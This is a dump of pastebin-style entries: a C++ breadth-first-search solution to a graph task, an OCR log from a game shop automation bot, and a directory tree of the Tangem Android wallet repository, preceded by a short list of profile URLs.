id,title,username,language,date,content
•	https://telegra.ph/DSBESB-06-03
•	https://muckrack.com/vangilde-sposito/bio
•	https://profile.hatena.ne.jp/basderta/
•	http://aldenfamilydentistry.com/UserProfile/tabid/57/userId/786338/Default.aspx
•	https://www.fitlynk.com/1717386878F805381
"
8hBFYs9X,solved B7 task,hpnq,C++,Sunday 2nd of June 2024 10:53:39 PM CDT,"#include <iostream>
#include <queue>
#include <random>

#define mp make_pair
#define cve(tpy) for (int i = 0; i < sizeof(tpy)/sizeof(tpy[0]); i++) {for(int j = 0; j < sizeof(tpy[i])/sizeof(tpy[i][0]); j++){cout << tpy[i][j] << "" "";  }cout << ""\n"";} ;
#define f first
#define s second
#define loop(i, x, n) for (int i = x; i < n; i++)
#define joop(x, n) for (ll j = x; j < n; j++)
#define lp(n) for (ll i = 0; i < n; i++)
#define err cout << ""ERROR"" << endl;
#define all(x) x.begin(), x.end()
#define pb push_back
#define sz(x) x.size()
#define rndm rng()

using namespace std;

// types
typedef long long ll;
typedef long double ld;

// types of data
#define inf 1000000000
#define infll 1000000000000000000
#define INF ll(1e9)

#define md 998244353
#define mod 1000000009
//#define K 239017

#define DEBUG 1

const int N = 20;

void bfs(int adjList[N][N], int startNode, bool visited[N]) {
    // Create a queue for BFS
    int queue[N];
    int front = 0, rear = 0;

    // Mark the current node as visited and enqueue it
    visited[startNode] = true;
    queue[rear++] = startNode;

    // Iterate over the queue
    while (front != rear) {
        int currentNode = queue[front++];
        for (int neighbor = 0; neighbor < N; neighbor++) {
            if (adjList[currentNode][neighbor] && !visited[neighbor]) {
                visited[neighbor] = true;
                queue[rear++] = neighbor;
            }
        }
    }
}

void solve() {
    int n = 20;
    int g[N][N] = {0};
    loop(i, 0, n) {
        loop(j, 0, n) {
            int a;
            cin >> a;
            if (a == 1) {
                g[i][j] = 1;
                g[j][i] = 1;
            }
        }
    }
    int start = 2;
    bool vis[N] = {0};
    cout << ""first group:\n"";
    bfs(g, start, vis);
    loop(i, 0, n) {
        if (vis[i]) {
            cout << i + 1 << "" "";
        }
    }
    cout << ""\n"";
    cout << ""second group:\n"";
    bool vis2[N] = {0};
    bfs(g, start, vis2);
    loop(i, 0, n) {
        if (!vis2[i]) {
            cout << i + 1 << "" "";
        }
    }
}

int main() {
    freopen(""text.txt"", ""r"", stdin);
    solve();
    return 1;
}
"
Ah8T7NGW,Untitled,SaarChaffee,Visual Pro Log,Sunday 2nd of June 2024 10:48:47 PM CDT,"```log
2024-06-03 11:34:11.654 | INFO | [Server] en                                                                           
2024-06-03 11:34:11.741 | INFO | Costs: [PURPLECOINS_3, YELLOWCOINS_1, YELLOWCOINS_2]                                  
2024-06-03 11:34:11.747 | INFO | Loading template folder: ./assets/shop/os                                             
2024-06-03 11:34:11.865 | INFO | [next_template_index] 106                                                             
2024-06-03 11:34:11.890 | INFO | Loading OCR dependencies                                                              
2024-06-03 11:34:13.113 | INFO | Loading OCR model: ./bin/cnocr_models/azur_lane                                       
2024-06-03 11:34:13.215 | INFO | [Amount_ocr 1.328s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.273 | INFO | [Price_ocr 0.044s] [300, 100, 20, 300, 50]                                            
2024-06-03 11:34:13.277 | INFO | Shop items found: ['GearPartSpecialized_x1_PurpleCoins_x300',                         
'GearPartPrototype_x1_PurpleCoins_x100', 'PlateRandomT4_x1_PurpleCoins_x20', 'GearDesignPlanT3_x1_PurpleCoins_x300',   
'GearDesignPlanT2_x1_PurpleCoins_x50']                                                                                 
2024-06-03 11:34:13.300 | INFO | [Amount_ocr 0.013s] [1, 1]                                                            
2024-06-03 11:34:13.335 | INFO | [Price_ocr 0.020s] [2500, 1000]                                                       
2024-06-03 11:34:13.340 | INFO | Shop items found: ['RepairPackFull2_x1_YellowCoins_x2500',                            
'RepairPackFull_x1_YellowCoins_x1000']                                                                                 
2024-06-03 11:34:13.372 | INFO | Costs: [PURPLECOINS_1, PURPLECOINS_2, YELLOWCOINS_1, YELLOWCOINS_2]                   
2024-06-03 11:34:13.400 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.452 | INFO | [Price_ocr 0.039s] [300, 100, 20, 500, 300]                                           
2024-06-03 11:34:13.457 | INFO | Shop items found: ['GearPartSpecialized_x1_PurpleCoins_x300',                         
'GearPartPrototype_x1_PurpleCoins_x100', 'PlateRandomT4_x1_PurpleCoins_x20',                                           
'OrdnanceTestingReportT3_x1_PurpleCoins_x500', 'GearDesignPlanT3_x1_PurpleCoins_x300']                                 
2024-06-03 11:34:13.478 | INFO | [Amount_ocr 0.013s] [1, 1]                                                            
2024-06-03 11:34:13.503 | INFO | [Price_ocr 0.019s] [2500, 1000]                                                       
2024-06-03 11:34:13.508 | INFO | Shop items found: ['RepairPackFull2_x1_YellowCoins_x2500',                            
'RepairPackFull_x1_YellowCoins_x1000']                                                                                 
2024-06-03 11:34:13.539 | INFO | Costs: [PURPLECOINS_1, PURPLECOINS_2, YELLOWCOINS_1, YELLOWCOINS_2]                   
2024-06-03 11:34:13.567 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.614 | INFO | [Price_ocr 0.037s] [300, 100, 20, 500, 300]                                           
2024-06-03 11:34:13.619 | INFO | Shop items found: ['GearPartSpecialized_x1_PurpleCoins_x300',                         
'GearPartPrototype_x1_PurpleCoins_x100', 'PlateRandomT4_x1_PurpleCoins_x20',                                           
'OrdnanceTestingReportT3_x1_PurpleCoins_x500', 'GearDesignPlanT3_x1_PurpleCoins_x300']                                 
2024-06-03 11:34:13.640 | INFO | [Amount_ocr 0.014s] [1, 1]                                                            
2024-06-03 11:34:13.664 | INFO | [Price_ocr 0.018s] [2500, 1000]                                                       
2024-06-03 11:34:13.669 | INFO | Shop items found: ['RepairPackFull2_x1_YellowCoins_x2500',                            
'RepairPackFull_x1_YellowCoins_x1000']                                                                                 
2024-06-03 11:34:13.700 | INFO | Costs: [PURPLECOINS_1, PURPLECOINS_1, PURPLECOINS_2, PURPLECOINS_2]                   
2024-06-03 11:34:13.728 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.780 | INFO | [Price_ocr 0.039s] [1, 5, 5, 5, 5]                                                    
2024-06-03 11:34:13.785 | INFO | Shop items found: ['METARedBookT2_x1_PurpleCoins_x1',                                 
'SupercavitationGenerator_x1_PurpleCoins_x5', 'NeuroplasticProstheticArm_x1_PurpleCoins_x5',                           
'NanoceramicAlloy_x1_PurpleCoins_x5', 'CrystallizedHeatResistantSteel_x1_PurpleCoins_x5']                              
2024-06-03 11:34:13.814 | INFO | [Amount_ocr 0.021s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.864 | INFO | [Price_ocr 0.039s] [1, 5, 5, 5, 5]                                                    
2024-06-03 11:34:13.868 | INFO | Shop items found: ['METARedBookT2_x1_PurpleCoins_x1',                                 
'SupercavitationGenerator_x1_PurpleCoins_x5', 'NeuroplasticProstheticArm_x1_PurpleCoins_x5',                           
'NanoceramicAlloy_x1_PurpleCoins_x5', 'CrystallizedHeatResistantSteel_x1_PurpleCoins_x5']                              
2024-06-03 11:34:13.900 | INFO | Costs: [PURPLECOINS_1, PURPLECOINS_1, PURPLECOINS_2, PURPLECOINS_2]                   
2024-06-03 11:34:13.928 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:13.985 | INFO | [Price_ocr 0.038s] [100, 20, 50, 500, 150]                                            
2024-06-03 11:34:13.990 | INFO | Shop items found: ['OrdnanceTestingReportT2_x1_PurpleCoins_x100',                     
'OrdnanceTestingReportT1_x1_PurpleCoins_x20', 'GearDesignPlanT2_x1_PurpleCoins_x50', 'RepairPack2_x1_YellowCoins_x500',
'RepairPack_x1_YellowCoins_x150']                                                                                      
2024-06-03 11:34:14.020 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:14.069 | INFO | [Price_ocr 0.038s] [100, 20, 100, 20, 50]                                             
2024-06-03 11:34:14.074 | INFO | Shop items found: ['GearPartPrototype_x1_PurpleCoins_x100',                           
'PlateRandomT4_x1_PurpleCoins_x20', 'OrdnanceTestingReportT2_x1_PurpleCoins_x100',                                     
'OrdnanceTestingReportT1_x1_PurpleCoins_x20', 'GearDesignPlanT2_x1_PurpleCoins_x50']                                   
2024-06-03 11:34:14.105 | INFO | Costs: [PURPLECOINS_1, PURPLECOINS_2, YELLOWCOINS_1, YELLOWCOINS_2]                   
2024-06-03 11:34:14.133 | INFO | [Amount_ocr 0.022s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:14.179 | INFO | [Price_ocr 0.037s] [300, 100, 20, 500, 300]                                           
2024-06-03 11:34:14.184 | INFO | Shop items found: ['GearPartSpecialized_x1_PurpleCoins_x300',                         
'GearPartPrototype_x1_PurpleCoins_x100', 'PlateRandomT4_x1_PurpleCoins_x20',                                           
'OrdnanceTestingReportT3_x1_PurpleCoins_x500', 'GearDesignPlanT3_x1_PurpleCoins_x300']                                 
2024-06-03 11:34:14.205 | INFO | [Amount_ocr 0.013s] [1, 1]                                                            
2024-06-03 11:34:14.231 | INFO | [Price_ocr 0.019s] [2500, 1000]                                                       
2024-06-03 11:34:14.235 | INFO | Shop items found: ['RepairPackFull2_x1_YellowCoins_x2500',                            
'RepairPackFull_x1_YellowCoins_x1000']                                                                                 
2024-06-03 11:34:14.266 | INFO | Costs: [YELLOWCOINS_1, YELLOWCOINS_1, YELLOWCOINS_2]                                  
2024-06-03 11:34:14.294 | INFO | [Amount_ocr 0.021s] [1, 1, 1, 1, 1]                                                   
2024-06-03 11:34:14.352 | INFO | [Price_ocr 0.037s] [500, 10, 10, 10, 3000]                                            
2024-06-03 11:34:14.358 | INFO | Shop items found: ['EnergyStorageDevice_x1_YellowCoins_x500',                         
'TuningSampleCombat_x1_PurpleCoins_x10', 'TuningSampleSurvival_x1_PurpleCoins_x10',                                    
'TuningSampleOffence_x1_PurpleCoins_x10', 'LoggerAbyssalT4_x1_YellowCoins_x3000']                                      
2024-06-03 11:34:14.376 | INFO | [Amount_ocr 0.010s] [1]                                                               
2024-06-03 11:34:14.395 | INFO | [Price_ocr 0.013s] [1000]                                                             
2024-06-03 11:34:14.400 | INFO | Shop items found: ['LoggerAbyssalT3_x1_YellowCoins_x1000']                            
```"
WEaR5uTR,com.tangem.wallet 2024-06-03 Tree structure of repository,dannybuntu,Bash,Sunday 2nd of June 2024 10:19:21 PM CDT,"danny@lw10:~/work/builds/com.tangem/tangem-app-android$ tree
.
├── app
│   ├── build.gradle.kts
│   ├── libs
│   │   ├── ripple-core-0.0.1.jar
│   │   └── walletconnect-1.5.6.aar
│   ├── proguard-rules.pro
│   └── src
│       ├── androidTest
│       │   └── kotlin
│       │       └── com
│       │           └── tangem
│       │               ├── common
│       │               │   ├── ApplicationInjectionExecutionRule.kt
│       │               │   ├── BaseTestCase.kt
│       │               │   ├── di
│       │               │   │   ├── TangemMockedApplication.kt
│       │               │   │   └── TestModule.kt
│       │               │   ├── HiltTestRunner.kt
│       │               │   └── TangemEmptyApplication.kt
│       │               ├── screens
│       │               │   ├── DisclaimerScreen.kt
│       │               │   ├── StoriesScreen.kt
│       │               │   └── WalletScreen.kt
│       │               └── tests
│       │                   ├── MainScreenTest.kt
│       │                   ├── ScanErrorTest.kt
│       │                   └── StoriesTest.kt
│       ├── debug
│       │   └── res
│       │       ├── values
│       │       │   └── strings.xml
│       │       └── xml
│       │           └── network_security_config.xml
│       ├── external
│       │   └── res
│       │       ├── values
│       │       │   └── strings.xml
│       │       └── xml
│       │           └── network_security_config.xml
│       ├── internal
│       │   └── res
│       │       ├── values
│       │       │   └── strings.xml
│       │       └── xml
│       │           └── network_security_config.xml
│       ├── main
│       │   ├── AndroidManifest.xml
│       │   ├── assets
│       │   │   ├── features_dev.json
│       │   │   ├── features_prod.json
│       │   │   ├── fw_hashes.json
│       │   │   ├── tangem-app-config
│       │   │   ├── testnet_tokens.json
│       │   │   └── tokens.json
│       │   ├── ic_launcher-playstore.png
│       │   ├── java
│       │   │   └── com
│       │   │       └── tangem
│       │   │           └── tap
│       │   │               ├── ActivityResultCaller.kt
│       │   │               ├── ApplicationEntryPoint.kt
│       │   │               ├── common
│       │   │               │   ├── ActivityResultCallbackHolder.kt
│       │   │               │   ├── analytics
│       │   │               │   │   ├── AnalyticsEventsLogger.kt
│       │   │               │   │   ├── AnalyticsFactory.kt
│       │   │               │   │   ├── api
│       │   │               │   │   │   └── AnalyticsHandlerBuilder.kt
│       │   │               │   │   ├── converters
│       │   │               │   │   │   ├── AnalyticsErrorConverter.kt
│       │   │               │   │   │   └── ParamCardCurrencyConverter.kt
│       │   │               │   │   ├── DefaultChangeCardAnalyticsContextUseCase.kt
│       │   │               │   │   ├── events
│       │   │               │   │   │   ├── AnalyticsParam.kt
│       │   │               │   │   │   ├── BlockchainExceptionEvent.kt
│       │   │               │   │   │   ├── Chat.kt
│       │   │               │   │   │   ├── DetailsScreen.kt
│       │   │               │   │   │   ├── IntroductionProcess.kt
│       │   │               │   │   │   ├── MainScreen.kt
│       │   │               │   │   │   ├── ManageTokens.kt
│       │   │               │   │   │   ├── Onboarding.kt
│       │   │               │   │   │   ├── Settings.kt
│       │   │               │   │   │   ├── Shop.kt
│       │   │               │   │   │   ├── SignIn.kt
│       │   │               │   │   │   ├── Token.kt
│       │   │               │   │   │   └── WalletConnect.kt
│       │   │               │   │   ├── handlers
│       │   │               │   │   │   ├── amplitude
│       │   │               │   │   │   │   ├── AmplitudeAnalyticsHandler.kt
│       │   │               │   │   │   │   ├── AmplitudeClient.kt
│       │   │               │   │   │   │   └── AmplitudeLogClient.kt
│       │   │               │   │   │   ├── BlockchainExceptionHandler.kt
│       │   │               │   │   │   └── firebase
│       │   │               │   │   │       ├── FirebaseAnalyticsHandler.kt
│       │   │               │   │   │       ├── FirebaseClient.kt
│       │   │               │   │   │       └── FirebaseLogClient.kt
│       │   │               │   │   └── paramsInterceptor
│       │   │               │   │       ├── CardContextInterceptor.kt
│       │   │               │   │       └── LinkedCardContextInterceptor.kt
│       │   │               │   ├── apptheme
│       │   │               │   │   └── MutableAppThemeModeHolder.kt
│       │   │               │   ├── chat
│       │   │               │   │   ├── ChatManager.kt
│       │   │               │   │   └── opener
│       │   │               │   │       ├── ChatOpener.kt
│       │   │               │   │       └── implementation
│       │   │               │   │           └── SprinklrChatOpener.kt
│       │   │               │   ├── clipboard
│       │   │               │   │   ├── DefaultClipboardManager.kt
│       │   │               │   │   └── MockClipboardManager.kt
│       │   │               │   ├── compose
│       │   │               │   │   ├── extensions
│       │   │               │   │   │   ├── AnimatedValue.kt
│       │   │               │   │   │   ├── Dp.kt
│       │   │               │   │   │   ├── ImageBitmap.kt
│       │   │               │   │   │   └── Painter.kt
│       │   │               │   │   └── TangemTextFieldsDefault.kt
│       │   │               │   ├── CurrencyConverter.kt
│       │   │               │   ├── CustomTabsManager.kt
│       │   │               │   ├── DialogManager.kt
│       │   │               │   ├── entities
│       │   │               │   │   ├── Button.kt
│       │   │               │   │   └── ProgressState.kt
│       │   │               │   ├── extensions
│       │   │               │   │   ├── Activity.kt
│       │   │               │   │   ├── Analytics.kt
│       │   │               │   │   ├── Bitmap.kt
│       │   │               │   │   ├── Blockchain.kt
│       │   │               │   │   ├── Context.kt
│       │   │               │   │   ├── Int.kt
│       │   │               │   │   ├── Map.kt
│       │   │               │   │   ├── Navigation.kt
│       │   │               │   │   ├── Specific.kt
│       │   │               │   │   ├── Store.kt
│       │   │               │   │   ├── StringBuilder.kt
│       │   │               │   │   ├── String.kt
│       │   │               │   │   ├── TextView.kt
│       │   │               │   │   ├── UI.kt
│       │   │               │   │   ├── ViewGroup.kt
│       │   │               │   │   ├── WalletManager.kt
│       │   │               │   │   └── WebView.kt
│       │   │               │   ├── feature
│       │   │               │   │   └── Feature.kt
│       │   │               │   ├── feedback
│       │   │               │   │   ├── AdditionalFeedbackInfo.kt
│       │   │               │   │   ├── DefaultFeedbackManagerFeatureToggles.kt
│       │   │               │   │   ├── FeedbackDataBuilder.kt
│       │   │               │   │   ├── FeedbackData.kt
│       │   │               │   │   └── FeedbackManager.kt
│       │   │               │   ├── GlobalLayoutStateHandler.kt
│       │   │               │   ├── Handler.kt
│       │   │               │   ├── haptic
│       │   │               │   │   └── DefaultHapticManager.kt
│       │   │               │   ├── images
│       │   │               │   │   └── Coil.kt
│       │   │               │   ├── KeyboardObserver.kt
│       │   │               │   ├── leapfrogWidget
│       │   │               │   │   └── TestLeapfrogFragment.kt
│       │   │               │   ├── log
│       │   │               │   │   ├── TangemCardSDKLogger.kt
│       │   │               │   │   ├── TangemLogCollector.kt
│       │   │               │   │   └── TimberFormatStrategy.kt
│       │   │               │   ├── recyclerView
│       │   │               │   │   └── SpaceItemDecoration.kt
│       │   │               │   ├── redux
│       │   │               │   │   ├── AccessCodeRequestPolicyMiddleware.kt
│       │   │               │   │   ├── AppDialog.kt
│       │   │               │   │   ├── AppReducer.kt
│       │   │               │   │   ├── AppState.kt
│       │   │               │   │   ├── FeatureRepositoryProvider.kt
│       │   │               │   │   ├── global
│       │   │               │   │   │   ├── GlobalAction.kt
│       │   │               │   │   │   ├── GlobalMiddleware.kt
│       │   │               │   │   │   ├── GlobalReducer.kt
│       │   │               │   │   │   └── GlobalState.kt
│       │   │               │   │   ├── legacy
│       │   │               │   │   │   └── LegacyMiddleware.kt
│       │   │               │   │   ├── LockUserWalletsTimerMiddleware.kt
│       │   │               │   │   ├── LogMiddleware.kt
│       │   │               │   │   ├── navigation
│       │   │               │   │   │   ├── NavigationMiddleware.kt
│       │   │               │   │   │   └── NavigationReducer.kt
│       │   │               │   │   └── NotificationsMiddleware.kt
│       │   │               │   ├── snackBar
│       │   │               │   │   └── MaxAmountSnackbar.kt
│       │   │               │   ├── SnackbarHandler.kt
│       │   │               │   ├── TestActions.kt
│       │   │               │   ├── text
│       │   │               │   │   ├── DecimalDigitsInputFilter.kt
│       │   │               │   │   └── Truncate.kt
│       │   │               │   ├── toggleWidget
│       │   │               │   │   ├── IndeterminateProgressButtonWidget.kt
│       │   │               │   │   ├── RefreshBalanceWidget.kt
│       │   │               │   │   └── ViewStateWidget.kt
│       │   │               │   ├── transitions
│       │   │               │   │   └── OnboardingTransitions.kt
│       │   │               │   └── ui
│       │   │               │       ├── AddressInfoBottomSheetDialog.kt
│       │   │               │       ├── RussianCardholdersWarningBottomSheetDialog.kt
│       │   │               │       ├── ScanFailsDialog.kt
│       │   │               │       ├── SimpleAlertDialog.kt
│       │   │               │       └── SimpleOkDialog.kt
│       │   │               ├── data
│       │   │               │   ├── RuntimeUserWalletsStore.kt
│       │   │               │   └── TangemBlockchainSDKLogger.kt
│       │   │               ├── di
│       │   │               │   ├── ActivityModule.kt
│       │   │               │   ├── analytics
│       │   │               │   │   └── AnalyticsModule.kt
│       │   │               │   ├── AppStateHolderModule.kt
│       │   │               │   ├── ClipboardManagerModule.kt
│       │   │               │   ├── data
│       │   │               │   │   ├── BlockchainSDKLoggerModule.kt
│       │   │               │   │   ├── CardDataModule.kt
│       │   │               │   │   ├── CardSDKLoggerModule.kt
│       │   │               │   │   └── UserWalletsStoreModule.kt
│       │   │               │   ├── domain
│       │   │               │   │   ├── AnalyticsDomainModule.kt
│       │   │               │   │   ├── AppCurrencyDomainModule.kt
│       │   │               │   │   ├── AppThemeDomainModule.kt
│       │   │               │   │   ├── CardDomainModule.kt
│       │   │               │   │   ├── CardLegacyDomainModule.kt
│       │   │               │   │   ├── FeedbackDomainModule.kt
│       │   │               │   │   ├── MnemonicModule.kt
│       │   │               │   │   ├── OnboardingDomainModule.kt
│       │   │               │   │   ├── QrScanningDomainModule.kt
│       │   │               │   │   ├── SettingsDomainModule.kt
│       │   │               │   │   ├── StakingDomainModule.kt
│       │   │               │   │   ├── TokensDomainModule.kt
│       │   │               │   │   ├── TransactionDomainModule.kt
│       │   │               │   │   ├── TxHistoryDomainModule.kt
│       │   │               │   │   ├── VisaDomainModule.kt
│       │   │               │   │   ├── WalletConnectDomainModule.kt
│       │   │               │   │   ├── WalletManagersFacadeModule.kt
│       │   │               │   │   └── WalletsDomainModule.kt
│       │   │               │   ├── FeedbackManagerFeatureTogglesModule.kt
│       │   │               │   ├── HapticModule.kt
│       │   │               │   ├── Qualifiers.kt
│       │   │               │   ├── RootAppComponentContextModule.kt
│       │   │               │   ├── TangemSdkManagerModule.kt
│       │   │               │   ├── ThemeModule.kt
│       │   │               │   └── UiDependenciesModule.kt
│       │   │               ├── domain
│       │   │               │   ├── card
│       │   │               │   │   ├── DefaultDeleteSavedAccessCodesUseCase.kt
│       │   │               │   │   ├── DefaultDerivationsRepository.kt
│       │   │               │   │   ├── DefaultResetCardUseCase.kt
│       │   │               │   │   └── MissedDerivationsFinder.kt
│       │   │               │   ├── configurable
│       │   │               │   │   └── warningMessage
│       │   │               │   │       ├── WarningMessage.kt
│       │   │               │   │       └── WarningMessagesManager.kt
│       │   │               │   ├── extensions
│       │   │               │   │   └── Card.kt
│       │   │               │   ├── model
│       │   │               │   │   ├── Currency.kt
│       │   │               │   │   ├── PendingTransaction.kt
│       │   │               │   │   └── WalletAddressData.kt
│       │   │               │   ├── scanCard
│       │   │               │   │   ├── chains
│       │   │               │   │   │   ├── AnalyticsChain.kt
│       │   │               │   │   │   ├── CheckForOnboardingChain.kt
│       │   │               │   │   │   ├── DisclaimerChain.kt
│       │   │               │   │   │   ├── FailedScansCounterChain.kt
│       │   │               │   │   │   ├── ScanChainException.kt
│       │   │               │   │   │   └── ScanChainResult.kt
│       │   │               │   │   ├── DefaultScanCardProcessor.kt
│       │   │               │   │   ├── LegacyScanProcessor.kt
│       │   │               │   │   ├── repository
│       │   │               │   │   │   └── DefaultScanCardRepository.kt
│       │   │               │   │   ├── UseCaseScanProcessor.kt
│       │   │               │   │   └── utils
│       │   │               │   │       └── ScanCardExceptionConverter.kt
│       │   │               │   ├── sdk
│       │   │               │   │   ├── impl
│       │   │               │   │   │   ├── DefaultTangemSdkManager.kt
│       │   │               │   │   │   └── MockTangemSdkManager.kt
│       │   │               │   │   ├── mocks
│       │   │               │   │   │   ├── content
│       │   │               │   │   │   │   ├── Wallet2MockContent.kt
│       │   │               │   │   │   │   └── WalletMockContent.kt
│       │   │               │   │   │   ├── MockContent.kt
│       │   │               │   │   │   └── MockProvider.kt
│       │   │               │   │   └── TangemSdkManager.kt
│       │   │               │   ├── settings
│       │   │               │   │   └── DefaultLegacySettingsRepository.kt
│       │   │               │   ├── TangemSigner.kt
│       │   │               │   ├── TapErrors.kt
│       │   │               │   ├── TapWalletManager.kt
│       │   │               │   ├── tasks
│       │   │               │   │   ├── product
│       │   │               │   │   │   ├── CardInitializationValidator.kt
│       │   │               │   │   │   ├── CreateProductWalletTask.kt
│       │   │               │   │   │   ├── CreateWalletsTask.kt
│       │   │               │   │   │   ├── DerivationsFinder.kt
│       │   │               │   │   │   ├── ProductCommandProcessor.kt
│       │   │               │   │   │   ├── ResetToFactorySettingsTask.kt
│       │   │               │   │   │   └── ScanProductTask.kt
│       │   │               │   │   └── SignHashesTask.kt
│       │   │               │   ├── twins
│       │   │               │   │   ├── CreateFirstTwinWalletTask.kt
│       │   │               │   │   ├── CreateSecondTwinWalletTask.kt
│       │   │               │   │   ├── FinalizeTwinTask.kt
│       │   │               │   │   ├── IncompatibleTwinCard.kt
│       │   │               │   │   ├── TwinCardsManager.kt
│       │   │               │   │   ├── TwinCardsWidget.kt
│       │   │               │   │   ├── WriteProtectedIssuerDataTask.kt
│       │   │               │   │   └── WrongTwinCard.kt
│       │   │               │   ├── userWalletList
│       │   │               │   │   ├── di
│       │   │               │   │   │   └── UserWalletsListManagerModule.kt
│       │   │               │   │   ├── implementation
│       │   │               │   │   │   ├── BiometricUserWalletsListManager.kt
│       │   │               │   │   │   ├── GeneralUserWalletsListManager.kt
│       │   │               │   │   │   └── RuntimeUserWalletsListManager.kt
│       │   │               │   │   ├── model
│       │   │               │   │   │   ├── UserWalletEncryptionKey.kt
│       │   │               │   │   │   └── UserWalletInformation.kt
│       │   │               │   │   ├── repository
│       │   │               │   │   │   ├── DelegatedKeystoreManager.kt
│       │   │               │   │   │   ├── implementation
│       │   │               │   │   │   │   ├── BiometricUserWalletsKeysRepository.kt
│       │   │               │   │   │   │   ├── DefaultSelectedUserWalletRepository.kt
│       │   │               │   │   │   │   ├── DefaultUserWalletsPublicInformationRepository.kt
│       │   │               │   │   │   │   └── DefaultUserWalletsSensitiveInformationRepository.kt
│       │   │               │   │   │   ├── SelectedUserWalletRepository.kt
│       │   │               │   │   │   ├── UserWalletsKeysRepository.kt
│       │   │               │   │   │   ├── UserWalletsKeysStoreDecorator.kt
│       │   │               │   │   │   ├── UserWalletsPublicInformationRepository.kt
│       │   │               │   │   │   └── UserWalletsSensitiveInformationRepository.kt
│       │   │               │   │   └── utils
│       │   │               │   │       ├── ByteArrayListExtensions.kt
│       │   │               │   │       ├── json
│       │   │               │   │       │   ├── ByteArrayKeyAdapter.kt
│       │   │               │   │       │   ├── CardBackupStatusAdapter.kt
│       │   │               │   │       │   ├── DerivationPathAdapterWithMigration.kt
│       │   │               │   │       │   ├── ExtendedPublicKeysMapAdapter.kt
│       │   │               │   │       │   ├── ScanResponseDerivedKeysMapAdapter.kt
│       │   │               │   │       │   └── WalletDerivedKeysMapAdapter.kt
│       │   │               │   │       ├── Mapper.kt
│       │   │               │   │       └── UserWalletEncyptionKeyCalculator.kt
